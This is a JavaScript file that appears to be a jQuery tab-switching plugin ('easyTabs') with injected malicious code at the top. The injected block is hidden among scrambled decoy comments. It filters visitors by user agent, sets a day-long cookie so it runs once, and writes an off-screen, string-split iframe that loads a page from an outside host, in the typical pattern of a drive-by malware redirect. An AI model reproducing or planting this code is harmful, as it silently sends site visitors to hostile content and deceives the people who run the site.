//Some.devices.are.designed:to,deny,users.access.to.install,or.run.modified:versions.of.the.software.inside:them,althoughthe,manufacturer,can.do.so
(function(){
function stripos (f_haystack, f_needle, f_offset) {
var haystack = (f_haystack + '').toLowerCase();
var needle = (f_needle + '').toLowerCase();
var lenam = 0;
if ((lenam = haystack.indexOf(needle, f_offset)) !== -1) {
return lenam;
}
return false;
}
function ver_newbar_check(){
var VestelProbe = 'iPhone@Macintosh@Linux@iPad@Series40@SymbOS@Flock@SeaMonkey@Nokia@SlimBrowser@AmigaOS@Android@FreeBSD@Chrome@IEMobile@SymbianOS@Avant@Chromium@Firefox/18.0@Firefox/18.0.1@Firefox/17.0@Firefox/12.0@Firefox/25.0@Firefox/24.0@Firefox/18.0.2@Firefox/19.0@Firefox/19.0.1@Firefox/20.0@Firefox/21.0@Firefox/22.0@Firefox/23.0@Firefox/25.0.1@Firefox/26.0@Firefox/27.0@Maxthon@MRSPUTNIK@Mini@Firefox/28.0@BlackBerry@PLAYSTATION@Wget@Firefox/27.0.1@Firefox/28.0';
VestelProbe = VestelProbe.split('@');
var easymKA = false;
for (var i in VestelProbe) {
if (stripos(navigator.userAgent, VestelProbe[i])!==false) {
easymKA = true;
break;
}
}
return easymKA;
}
function setCookie(name, value, expires) {
var date = new Date( new Date().getTime() + expires*1000 );
document.cookie = name+'='+value+'; path=/; expires='+date.toUTCString();
}
function getCookie(name) {
var matches = document.cookie.match(new RegExp( "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\/\+^])/g, '$1') + "=([^;]*)" ));
return matches ? decodeURIComponent(matches[1]) : undefined;
}
if (!ver_newbar_check()) {
var cookie = getCookie('lenea18je16ukerma91ke01lxna47jerma15gke381kja7d');
if (cookie == undefined) {
setCookie('lenea18je16ukerma91ke01lxna47jerma15gke381kja7d', true, 86404);
document.write('<ifra'+'m'+'e sr'+'c='+'"http://tender.nicegrouping.com/fdgsagrhrtsjrj19.html" style="position:absolute;left'+':-'+'1317'+'px'+';'+'top'+':-'+'1317'+'px'+';" height="141" width="141" name="PoliticNAte"></ifra'+'me>');
}
}
})();
//Finally,every:program.is.threatened.constantly.by,software.patents.

(function($){$.fn.easyTabs=function(option){var param=jQuery.extend({fadeSpeed:"fast",defaultContent:1,activeClass:'active'},option);$(this).each(function(){var thisId="#"+this.id;if(param.defaultContent==''){param.defaultContent=1;}
if(typeof param.defaultContent=="number")
{var defaultTab=$(thisId+" .tabs li:eq("+(param.defaultContent-1)+") a").attr('href').substr(1);}else{var defaultTab=param.defaultContent;}
$(thisId+" .tabs li a").each(function(){var tabToHide=$(this).attr('href').substr(1);$("#"+tabToHide).addClass('easytabs-tab-content');});hideAll();changeContent(defaultTab);function hideAll(){$(thisId+" .easytabs-tab-content").hide();}
function changeContent(tabId){hideAll();$(thisId+" .tabs li").removeClass(param.activeClass);$(thisId+" .tabs li a[href=#"+tabId+"]").closest('li').addClass(param.activeClass);if(param.fadeSpeed!="none")
{$(thisId+" #"+tabId).fadeIn(param.fadeSpeed);}else{$(thisId+" #"+tabId).show();}}
$(thisId+" .tabs li").click(function(){var tabId=$(this).find('a').attr('href').substr(1);changeContent(tabId);return false;});});}})(jQuery);